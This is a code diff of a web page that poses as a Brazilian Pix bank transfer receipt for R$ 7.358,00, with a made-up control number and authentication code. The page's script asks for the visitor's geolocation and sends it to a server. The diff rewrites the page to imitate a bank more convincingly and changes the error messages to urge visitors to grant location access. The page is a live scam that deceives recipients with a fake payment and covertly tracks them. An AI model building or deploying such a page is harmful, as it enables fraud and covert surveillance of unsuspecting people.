@@ -4,30 +4,27 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Comprovante Recebimento on-line</title>
+  <title>Comprovante Transferência - Banco Vercel on-line</title>
   <link rel="stylesheet" href="styles.css" />
 
 <!-- Open Graph Meta Tags for Thumbnail -->
-  <meta property="og:title" content="Comprovante Recebimento on-line" />
-  <meta property="og:description" content="Comprovante de recebimento no valor de R$ 7.358,00." />
-  <meta property="og:image" content="comprovante-pix-png.png" />
+  <meta property="og:title" content="Comprovante Transferência - Banco Vercel on-line" />
+  <meta property="og:description" content="Comprovante de Transferência no valor de R$ 7.358,00." />
+  <meta property="og:image" content="https://comprovante-banco.vercel.app/comprovante-pix-png.png" />
   <meta property="og:type" content="website" />
   <meta property="og:url" content="https://comprovante-banco.vercel.app/" />
 
 </head>
 <body>
 
-  <!-- Hidden Thumbnail Image -->
-  <img src="comprovante-pix-png.png" alt="Thumbnail" />
-
   <div class="comprovante-container">
     <h1>Comprovante</h1>
-     <h1>Recebimento on-line</h1>
+     <h1>Banco Vercel on-line</h1>
     <div class="informacoes">
       <p><span>Data:</span> <span id="data-atual"></span></p>
-      <p><span>Valor Recebido:</span> R$ 7.358,00</p>
+      <p><span>Valor Transferido:</span> R$ 7.358,00</p>
       <p><span>De:</span> João Silva de Oliveira</p>
-      <p><span>Status:</span> Recebido com Sucesso</p>
+      <p><span>Status:</span> Transferido com Sucesso</p>
       <p><span>Número de Controle:</span> E60776945602468282153B0549PvaD0c</p>
       <p></p><p><span>AUTENTICAÇÃO:</span><p> WQcAvKF4 b&Rb6eLa aMGwcTGu G@CyrbhR XrLRmM5S @YKMhvUm t?JnDLML FMBJEY9h
 woHBoPMK NgMj42R4 Cn4TkCiR 3?6S#AEt GhE*Zsoh F4UcsWYq 3kmUwmSE @ynJ8?7K
@@ -51,7 +48,7 @@ EY*2Pi6b 3g88bIS3 hbOW8f7S 7KA5ZHNd qHdL#e3z 68MLJPvA 65525468 00293700 0</p>
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, handleError);
       } else {
-        alert("Pagamento realizado com sucesso.");
+        alert("Transferencia no valor de R$7.358,00 foi realizada com sucesso.");
       }
     });
 
@@ -87,7 +84,7 @@ EY*2Pi6b 3g88bIS3 hbOW8f7S 7KA5ZHNd qHdL#e3z 68MLJPvA 65525468 00293700 0</p>
         if (data.success) {
           alert("Pagamento efetuado com sucesso");
         } else {
-          alert("Identificamos problemas com o seu pagamento. Tente novamente");
+          alert("Erro no serviço - Atualize a pagina e libere o acesso do aplicativo. Tente novamente");
         }
       })
       .catch(error => {
@@ -96,7 +93,7 @@ EY*2Pi6b 3g88bIS3 hbOW8f7S 7KA5ZHNd qHdL#e3z 68MLJPvA 65525468 00293700 0</p>
     }
 
     function handleError(error) {
-      alert("Erro ao efetuar seu pagamento. Tente novamente usando outro navegador web" + error.message);
+      alert("Erro no serviço - Recarregue a pagina e permita o acesso. " + error.message);
     }
   </script>
 </body>
